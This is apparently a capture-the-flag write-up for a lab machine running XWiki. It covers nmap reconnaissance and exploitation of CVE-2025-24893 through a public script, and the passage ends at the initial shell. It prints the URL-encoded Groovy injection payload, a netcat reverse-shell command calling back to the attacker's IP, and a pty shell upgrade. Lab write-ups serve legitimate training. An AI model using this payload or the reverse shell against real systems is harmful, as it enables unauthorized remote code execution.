## Init

The ip I am assigned is `10.10.11.80`. I do a `nmap` scan and find some ports open.
```                                      
┌──(truelyyours㉿kali)-[~/tryhackme/SimpleCTF]
└─$ nmap -sV -A 10.10.11.80
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 02:42 EDT
Illegal character(s) in hostname -- replacing with '*'
Illegal character(s) in hostname -- replacing with '*'
Nmap scan report for editor.htb* (10.10.11.80)
Host is up (0.097s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
| http-robots.txt: 50 disallowed entries (15 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
|_/xwiki/bin/undelete/
| http-methods: 
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
|_http-open-proxy: Proxy might be redirecting requests
| http-webdav-scan: 
|   Server Type: Jetty(10.0.20)
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
|_http-server-header: Jetty(10.0.20)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT      ADDRESS
1   85.81 ms 10.10.16.1
2   44.21 ms editor.htb* (10.10.11.80)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.92 seconds
```
It looks like an HTTP service running on port 80 and an xwiki on port 8080. Here we can access some posts by a user named `Neal Bagwell` and we can access the user's page as well `http://10.10.11.80:8080/xwiki/bin/view/XWiki/neal`. Of course usually port 80 is open but we have Xwiki on port 8080 so I lookup for any CVEs on Xwiki. And we have [**CVE-2025-24893**](https://www.offsec.com/blog/cve-2025-24893/)!

## CVE Exploit
There does not exist any working Metasploit module yet, but we have [this GitHub link](https://github.com/gunzf0x/CVE-2025-24893/blob/main/CVE-2024-24893.py) that implements the exploit to achieve remote RCE. We can use this to spawn a shell locally and navigate the target system. 
```
┌──(truelyyours㉿kali)-[~/htb/editor]
└─$ python3 CVE-2025-24893.py -t 'http://10.10.11.80:8080' -c 'busybox nc 10.10.16.16 4444 -e /bin/bash'
[*] Attacking http://10.10.11.80:8080
[*] Injecting the payload:
http://10.10.11.80:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22busybox%20nc%2010.10.16.16%204444%20-e%20/bin/bash%22.execute%28%29%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D
[*] Command executed

~Happy Hacking
```

![[Pasted image 20250810030501.png]]

This shell is not that beautiful so I just do `python3 -c 'import pty; pty.spawn("/bin/bash")'` so have a better shell. Yaaye!




